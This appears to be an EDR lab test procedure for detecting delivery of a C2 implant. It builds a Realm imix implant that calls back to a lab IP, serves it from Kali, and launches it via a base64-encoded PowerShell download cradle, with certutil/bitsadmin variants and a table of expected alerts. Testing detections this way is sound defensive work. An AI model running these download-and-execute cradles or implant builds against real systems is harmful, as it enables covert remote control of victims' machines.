# Test: Delivery — encoded PowerShell download cradle

**Chain:** Kali serves implant → victim pulls it with a base64-encoded `IWR` command →
launch. The classic stager delivery.

**Implant setup — creation to the Windows machine (do once before the test):**

**a) Kali, one-time tooling** (skip if already installed):
```bash
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y && source ~/.cargo/env
rustup target add x86_64-pc-windows-gnu
sudo apt update && sudo apt install -y golang git
```

**b) Kali — clone Realm, build the implant (callback baked in), start the C2:**
```bash
git clone https://github.com/spellshift/realm.git ~/realm && cd ~/realm
git checkout -b latest $(git tag | tail -1)
go run ./tavern                 # terminal 1: Tavern C2 server - leave running

cd ~/realm/implants/imix        # terminal 2: build with YOUR Kali IP baked in
IMIX_CALLBACK_URI=http://172.16.69.109:8080 cargo build --release
mkdir -p ~/sideload-lab && cp target/release/imix.exe ~/sideload-lab/sysupd.exe
```

**c) Kali — serve the binaries:**
```bash
cd ~/sideload-lab && python3 -m http.server 8000
```

**d) Windows — put the implant on the machine + prep the EDR** (elevated PowerShell):
```powershell
Invoke-WebRequest http://172.16.69.109:8000/sysupd.exe -OutFile C:\Users\Public\sysupd.exe
# EDR running + fresh persistence baseline:
curl.exe -X POST http://127.0.0.1:8420/api/baseline
# console: http://127.0.0.1:8420 - alerts stream into the LIVE panel
```
These drops themselves should already fire `SIG-REALM-IMIX` / `SIG-RUST-IMPLANT`
(on-write scan) — delivery detection working before the test even starts.
Full reference: [`../_common/implant-build.md`](../_common/implant-build.md).


**Victim (elevated PowerShell):**

```powershell
.\test.ps1 -Kali 172.16.69.109
# or by hand:
$cmd  = "IWR http://172.16.69.109:8000/sysupd.exe -OutFile `$env:TEMP\sysupd.exe"
$enc  = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
powershell -NoProfile -EncodedCommand $enc          # fires PROC-ENC-PS + EVT-4688-SUSP
Start-Process "$env:TEMP\sysupd.exe"                # fires SIG-* / EVT-4688-TEMP / PROG-IMPLANT-LAUNCH
```

**Expected alerts (in order):**

| # | Rule | Sev | Trigger |
|---|---|---|---|
| 1 | `PROC-ENC-PS` | high | `-EncodedCommand` + base64 on the command line (WMI poll) |
| 2 | `EVT-4688-SUSP` | high | same command seen independently via kernel-fed 4688 |
| 3 | `SIG-REALM-IMPLANT` / `SIG-RUST-IMPLANT` | crit/high | on-write scan of the dropped exe |
| 4 | `EVT-4688-TEMP` | high | implant launched from %TEMP% |
| 5 | `PROG-IMPLANT-LAUNCH` | critical | launch-time image scan |
| 6 | `NET-BEACON` | critical | callback cadence (~1-2 min, real imix) |

**Variation:** cradle via `certutil -urlcache` or `bitsadmin /transfer` instead → expect
`PROC-LOLBIN-DOWNLOAD` (high) instead of #1/#2.

**Cleanup:** `..\..\poc-scripts\victim\05-full-cleanup.ps1`
